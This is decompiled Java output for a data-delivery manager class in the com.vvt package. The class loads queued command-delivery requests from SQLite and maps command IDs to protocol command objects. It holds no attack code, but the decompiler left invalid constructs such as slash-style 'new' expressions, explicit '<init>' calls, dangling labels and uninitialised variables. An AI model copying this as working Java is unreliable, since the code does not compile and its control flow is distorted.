package com.vvt.datadeliverymanager.b.a;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import com.vvt.datadeliverymanager.a;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.phoenix.prot.command.aa;
import com.vvt.phoenix.prot.command.ab;
import com.vvt.phoenix.prot.command.ac;
import com.vvt.phoenix.prot.command.ad;
import com.vvt.phoenix.prot.command.af;
import com.vvt.phoenix.prot.command.ai;
import com.vvt.phoenix.prot.command.f;
import com.vvt.phoenix.prot.command.g;
import com.vvt.phoenix.prot.command.i;
import com.vvt.phoenix.prot.command.j;
import com.vvt.phoenix.prot.command.k;
import com.vvt.phoenix.prot.command.l;
import com.vvt.phoenix.prot.command.m;
import com.vvt.phoenix.prot.command.n;
import com.vvt.phoenix.prot.command.o;
import com.vvt.phoenix.prot.command.p;
import com.vvt.phoenix.prot.command.q;
import com.vvt.phoenix.prot.command.r;
import com.vvt.phoenix.prot.command.s;
import com.vvt.phoenix.prot.command.t;
import com.vvt.phoenix.prot.command.u;
import com.vvt.phoenix.prot.command.v;
import com.vvt.phoenix.prot.command.w;
import com.vvt.phoenix.prot.command.x;
import com.vvt.phoenix.prot.command.y;
import com.vvt.phoenix.prot.command.z;
import java.util.ArrayList;
import java.util.List;

public class e
  implements b
{
  private static final boolean a = a.e;
  private static final boolean b = a.a;
  private d c;
  
  public e(Context paramContext, String paramString)
  {
    d locald = new com/vvt/datadeliverymanager/b/a/d;
    locald.<init>(paramContext, paramString);
    this.c = locald;
  }
  
  private com.vvt.phoenix.prot.command.b a(int paramInt)
  {
    Object localObject = null;
    switch (paramInt)
    {
    case 12: 
    case 13: 
    case 14: 
    case 15: 
    case 22: 
    case 23: 
    case 24: 
    case 26: 
    case 28: 
    case 30: 
    case 33: 
    case 35: 
    case 37: 
    case 38: 
    case 39: 
    case 41: 
    case 42: 
    case 43: 
    case 44: 
    case 45: 
    default: 
      boolean bool = a;
      if (!bool) {
        break;
      }
    }
    for (;;)
    {
      return (com.vvt.phoenix.prot.command.b)localObject;
      localObject = new com/vvt/phoenix/prot/command/r;
      ((r)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/s;
      ((s)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/u;
      ((u)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/v;
      ((v)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/x;
      ((x)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/y;
      ((y)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/aa;
      ((aa)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/ab;
      ((ab)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/ac;
      ((ac)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/ad;
      ((ad)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/af;
      ((af)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/af;
      ((af)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/f;
      ((f)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/g;
      ((g)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/h;
      ((com.vvt.phoenix.prot.command.h)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/k;
      ((k)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/l;
      ((l)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/j;
      ((j)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/m;
      ((m)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/n;
      ((n)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/p;
      ((p)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/q;
      ((q)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/t;
      ((t)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/w;
      ((w)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/z;
      ((z)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/i;
      ((i)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/ai;
      ((ai)localObject).<init>();
      continue;
      localObject = new com/vvt/phoenix/prot/command/o;
      ((o)localObject).<init>();
    }
  }
  
  public long a(com.vvt.datadeliverymanager.h paramh)
  {
    return this.c.a(paramh);
  }
  
  public void a()
  {
    i = 0;
    do
    {
      try
      {
        d locald = this.c;
        locald.a();
        j = 0;
        locald = null;
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          int j;
          boolean bool = a;
          if (bool) {}
          bool = true;
          i += 1;
          long l = 1000L;
          SystemClock.sleep(l);
        }
      }
      if (j == 0) {
        break;
      }
      j = 10;
    } while (i < j);
  }
  
  public boolean a(long paramLong)
  {
    return this.c.a(paramLong);
  }
  
  public void b()
  {
    this.c.b();
  }
  
  public boolean b(com.vvt.datadeliverymanager.h paramh)
  {
    return this.c.b(paramh);
  }
  
  public List c()
  {
    int i = 1;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject = this.c;
    Cursor localCursor = ((d)localObject).c();
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (localCursor != null)
    {
      com.vvt.datadeliverymanager.h localh;
      for (;;)
      {
        bool1 = localCursor.moveToNext();
        if (!bool1) {
          break label460;
        }
        localh = new com/vvt/datadeliverymanager/h;
        localh.<init>();
        int j = localCursor.getColumnIndexOrThrow("caller_id");
        j = localCursor.getInt(j);
        localh.a(j);
        j = localCursor.getColumnIndexOrThrow("cmd_id");
        j = localCursor.getInt(j);
        localObject = a(j);
        if (localObject != null) {
          break;
        }
        boolean bool2 = a;
        if (!bool2) {}
      }
      localh.a((com.vvt.phoenix.prot.command.b)localObject);
      int k = localCursor.getColumnIndexOrThrow("csId");
      long l = localCursor.getLong(k);
      localh.a(l);
      k = localCursor.getColumnIndexOrThrow("data_provider_type");
      localObject = DataProviderType.forValue(localCursor.getInt(k));
      localh.a((DataProviderType)localObject);
      k = localCursor.getColumnIndexOrThrow("delivery_request_type");
      localObject = DeliveryRequestType.forValue(localCursor.getInt(k));
      localh.a((DeliveryRequestType)localObject);
      localObject = "ready_to_resume";
      k = localCursor.getColumnIndexOrThrow((String)localObject);
      k = localCursor.getInt(k);
      label239:
      label378:
      int n;
      if (k > 0)
      {
        k = i;
        localh.a(k);
        int m = localCursor.getColumnIndexOrThrow("max_retry_count");
        m = localCursor.getInt(m);
        localh.c(m);
        m = localCursor.getColumnIndexOrThrow("priority_request");
        localObject = PriorityRequest.forValue(localCursor.getInt(m));
        localh.a((PriorityRequest)localObject);
        m = localCursor.getColumnIndexOrThrow("retry_count");
        m = localCursor.getInt(m);
        localh.b(m);
        m = localCursor.getColumnIndexOrThrow("delay_time");
        l = localCursor.getLong(m);
        localh.b(l);
        localObject = "is_require_encryption";
        m = localCursor.getColumnIndexOrThrow((String)localObject);
        m = localCursor.getInt(m);
        if (m != i) {
          break label446;
        }
        m = i;
        localh.b(m);
        localObject = "is_require_compression";
        n = localCursor.getColumnIndexOrThrow((String)localObject);
        n = localCursor.getInt(n);
        if (n != i) {
          break label453;
        }
        n = i;
      }
      for (;;)
      {
        localh.c(n);
        bool3 = b;
        if (bool3) {}
        localArrayList.add(localh);
        break;
        bool3 = false;
        localObject = null;
        break label239;
        label446:
        bool3 = false;
        localObject = null;
        break label378;
        label453:
        bool3 = false;
        localObject = null;
      }
      label460:
      localCursor.close();
    }
    boolean bool3 = b;
    if (bool3) {}
    bool3 = b;
    if (bool3) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/removeFromPath/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */